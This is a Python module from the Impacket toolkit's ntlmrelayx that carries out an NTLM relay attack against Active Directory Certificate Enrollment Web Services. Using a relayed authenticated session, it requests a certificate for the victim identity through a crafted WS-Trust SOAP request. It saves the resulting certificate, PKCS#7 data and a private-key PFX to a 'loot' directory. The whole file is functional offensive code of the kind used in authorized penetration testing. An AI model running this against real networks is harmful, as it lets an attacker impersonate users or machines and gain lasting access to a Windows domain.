# Impacket - Collection of Python classes for working with network protocols.
#
# Copyright Fortra, LLC and its affiliated companies
#
# All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Microsoft Certificate Enrollment Services (CES/WSTEP) relay attack.

import base64
import binascii
import os
import re
import uuid
import xml.etree.ElementTree as ET
from html import escape
from urllib.parse import urlparse, urlunparse

from cryptography import x509
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.serialization import Encoding, pkcs7

from impacket import LOG
from impacket.examples.ntlmrelayx.attacks.httpattacks.adcsattack import ADCSAttack


SOAP_NS = "http://www.w3.org/2003/05/soap-envelope"
ADDR_NS = "http://www.w3.org/2005/08/addressing"
WST_NS = "http://docs.oasis-open.org/ws-sx/ws-trust/200512"
WSS_NS = "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
WSS_UTILITY_NS = "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd"
AUTHZ_NS = "http://schemas.xmlsoap.org/ws/2006/12/authorization"
ENROLL_NS = "http://schemas.microsoft.com/windows/pki/2009/01/enrollment"
TOKEN_TYPE_X509V3 = "http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#X509v3"
REQUEST_TYPE_ISSUE = WST_NS + "/Issue"
VALUE_TYPE_PKCS10 = ENROLL_NS + "#PKCS10"
ENCODING_BASE64 = WSS_NS + "#base64binary"
CES_ACTION = ENROLL_NS + "/RST/wstep"
CES_TEMPLATE_DEFAULT = "Machine"
CES_MAX_RESPONSE = 10 * 1024 * 1024

_WHITESPACE_RE = re.compile(r"\s+")


class CESConfigurationError(ValueError):
    pass


def soap_http_headers(content_length):
    return {
        "Content-Type": "application/soap+xml; charset=utf-8",
        "User-Agent": "MS-WebServices/1.0",
        "Connection": "Keep-Alive",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Content-Length": str(content_length),
    }


def derive_subject_cn(relayed_username):
    if not relayed_username:
        return "CES-Enrollment"
    value = relayed_username.split("\\")[-1].split("/")[-1].split("@")[0]
    return value or "CES-Enrollment"


def build_additional_context(template):
    return '<AdditionalContext xmlns="%s"><ContextItem Name="CertificateTemplate"><Value>%s</Value></ContextItem></AdditionalContext>' % (
        AUTHZ_NS, escape(template, quote=True)
    )


def _has_explicit_port(netloc):
    authority = netloc.rsplit("@", 1)[-1]
    if authority.startswith("["):
        closing_bracket = authority.find("]")
        return closing_bracket >= 0 and authority[closing_bracket + 1:].startswith(":")
    return ":" in authority


def build_ces_soap(target_url, csr_b64, template=CES_TEMPLATE_DEFAULT, message_id=None):
    if not csr_b64:
        raise CESConfigurationError("CSR data is required")
    if not template:
        raise CESConfigurationError("Certificate template is required")
    parsed = urlparse(target_url)
    # Rebuild the URL without any identity/userinfo. Keep path, query and an
    # explicitly supplied port, including an explicit default port.
    host = parsed.hostname
    if ":" in host and not host.startswith("["):
        host = "[%s]" % host
    if _has_explicit_port(parsed.netloc):
        host = "%s:%d" % (host, parsed.port)
    to_url = urlunparse((parsed.scheme, host, parsed.path or "/", "", parsed.query, ""))
    mid = message_id or "urn:uuid:%s" % uuid.uuid4()
    return """<?xml version="1.0" encoding="utf-8"?>
<s:Envelope xmlns:a="{addr}" xmlns:s="{soap}">
  <s:Header>
    <a:Action s:mustUnderstand="1">{action}</a:Action>
    <a:MessageID>{message_id}</a:MessageID>
    <a:To s:mustUnderstand="1">{to}</a:To>
  </s:Header>
  <s:Body>
    <RequestSecurityToken PreferredLanguage="en-US" xmlns="{wst}">
      <TokenType>{token_type}</TokenType>
      <RequestType>{request_type}</RequestType>
      <BinarySecurityToken ValueType="{value_type}" EncodingType="{encoding}" a:Id="" xmlns:a="{utility}" xmlns="{wss}">{csr}</BinarySecurityToken>
      {context}
    </RequestSecurityToken>
  </s:Body>
</s:Envelope>
""".format(
        addr=ADDR_NS, soap=SOAP_NS, action=escape(CES_ACTION),
        message_id=escape(mid), to=escape(to_url), wst=WST_NS,
        token_type=escape(TOKEN_TYPE_X509V3), request_type=escape(REQUEST_TYPE_ISSUE),
        value_type=escape(VALUE_TYPE_PKCS10), encoding=escape(ENCODING_BASE64),
        utility=WSS_UTILITY_NS, wss=WSS_NS, csr=escape(csr_b64),
        context=build_additional_context(template),
    )


def target_url(target, relay_client=None):
    scheme = target.scheme.lower()
    host = target.hostname
    if ":" in host and not host.startswith("["):
        host = "[%s]" % host
    if _has_explicit_port(target.netloc):
        host = "%s:%d" % (host, target.port)
    path = getattr(relay_client, "path", None) or target.path or "/"
    query = getattr(relay_client, "query", None)
    if query is None:
        query = target.query
    return urlunparse((scheme, host, path, "", query, ""))


def extract_response_tokens(xml_bytes):
    if not xml_bytes:
        raise RuntimeError("CES returned an empty response")
    if len(xml_bytes) > CES_MAX_RESPONSE:
        raise RuntimeError("CES response exceeds the %d-byte limit" % CES_MAX_RESPONSE)
    try:
        root = ET.fromstring(xml_bytes)
    except ET.ParseError as exc:
        raise RuntimeError("CES returned malformed XML: %s" % exc) from exc

    fault = root.find(".//{%s}Fault" % SOAP_NS)
    if fault is not None:
        reason = fault.find(".//{%s}Text" % SOAP_NS)
        text = (reason.text or "").strip() if reason is not None else "unspecified fault"
        raise RuntimeError("CES SOAP fault: %s" % text[:1000])

    cert_tokens = []
    p7b_tokens = []
    for node in root.findall(".//{%s}BinarySecurityToken" % WSS_NS):
        value = _WHITESPACE_RE.sub("", node.text or "")
        if not value:
            continue
        value_type = node.attrib.get("ValueType", "")
        if "X509v3" in value_type:
            cert_tokens.append(value)
        elif "PKCS7" in value_type:
            p7b_tokens.append(value)
    return cert_tokens, p7b_tokens


def decode_certificate(value):
    try:
        data = base64.b64decode(value, validate=True)
        certificate = x509.load_der_x509_certificate(data)
    except (binascii.Error, ValueError) as exc:
        raise RuntimeError("CES returned an invalid X509 certificate token") from exc
    return data, certificate


def decode_pkcs7(value):
    try:
        data = base64.b64decode(value, validate=True)
        pkcs7.load_der_pkcs7_certificates(data)
    except (binascii.Error, ValueError) as exc:
        raise RuntimeError("CES returned an invalid PKCS#7 token") from exc
    return data


class CESAttack:
    @staticmethod
    def _read_response(response):
        body = response.read(CES_MAX_RESPONSE + 1)
        if len(body) > CES_MAX_RESPONSE:
            # Drain the connection without retaining additional untrusted data.
            while response.read(65536):
                pass
            raise RuntimeError("CES response exceeds the %d-byte limit" % CES_MAX_RESPONSE)
        return body

    def _run(self):
        identity = "%s\\%s" % (self.domain, self.username) if self.domain else self.username
        template = ADCSAttack.get_template(self.username, self.config.template)
        try:
            key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
            csr = ADCSAttack.generate_csr(key, derive_subject_cn(identity), None, csr_type=Encoding.DER)
            csr_b64 = base64.b64encode(csr).decode("ascii")
            url = target_url(self.target, self.relay_client)
            soap = build_ces_soap(url, csr_b64, template)
            body = soap.encode("utf-8")
            path = self.relay_client.path or "/"
            if self.relay_client.query:
                path += "?" + self.relay_client.query

            LOG.info("Requesting a certificate for %s using CES template %s", identity, template)
            # self.client is the already authenticated HTTP(S) connection.
            self.client.request("POST", path, body=body, headers=soap_http_headers(len(body)))
            response = self.client.getresponse()
            response_body = self._read_response(response)
            if response.status >= 400:
                diagnostic = response_body[:2000].decode("utf-8", errors="replace")
                raise RuntimeError("CES returned HTTP %d %s: %s" % (response.status, response.reason, diagnostic))

            cert_tokens, p7b_tokens = extract_response_tokens(response_body)
            cert_der = certificate = None
            p7b_der = None
            if cert_tokens:
                cert_der, certificate = decode_certificate(cert_tokens[-1])
            if p7b_tokens:
                p7b_der = decode_pkcs7(p7b_tokens[0])

            if not os.path.isdir(self.config.lootdir):
                os.makedirs(self.config.lootdir, exist_ok=True)
            output_name = ADCSAttack._sanitize_filename(identity)
            if cert_der is not None:
                cert_path = os.path.join(self.config.lootdir, output_name + ".cer")
                with open(cert_path, "wb") as output:
                    output.write(cert_der)
                LOG.info("Saved issued CES certificate: %s", cert_path)
            else:
                LOG.warning("CES response did not contain an X509v3 certificate; PFX was not created")

            if p7b_der is not None:
                p7b_path = os.path.join(self.config.lootdir, output_name + ".p7b")
                with open(p7b_path, "wb") as output:
                    output.write(p7b_der)
                LOG.info("Saved CES PKCS#7 response: %s", p7b_path)
            else:
                LOG.warning("CES response did not contain a PKCS#7 token")

            if certificate is not None:
                pfx_path = os.path.join(self.config.lootdir, output_name + ".pfx")
                with open(pfx_path, "wb") as output:
                    output.write(ADCSAttack.generate_pfx(key, certificate))
                LOG.info("Saved CES PFX: %s", pfx_path)
        except Exception as exc:
            LOG.error("CES SOAP enrollment failed: %s", exc)
